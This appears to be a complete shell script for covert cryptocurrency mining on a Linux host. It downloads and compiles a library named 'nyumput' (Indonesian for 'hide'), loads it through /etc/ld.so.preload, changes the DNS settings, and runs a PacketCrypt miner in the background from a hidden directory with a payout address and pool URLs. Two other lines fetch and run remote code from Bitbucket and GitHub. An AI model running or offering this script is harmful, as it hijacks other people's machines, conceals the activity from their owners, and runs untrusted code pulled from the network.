curl https://bitbucket.org/dennidarko01/kangkung/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
mkdir .kap && cd .kap
wget -O sgr1 https://www.pkt.world/ext/packetcrypt-linux-amd64
chmod 777 sgr1 
./sgr1 ann -p pPeVNWfAjPGdDst9A6BwgMpZMZuTFfJRRu http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/BianAnisa/REvolve/main/script/time.sh
chmod +x time.sh
timeout 55m ./time.sh
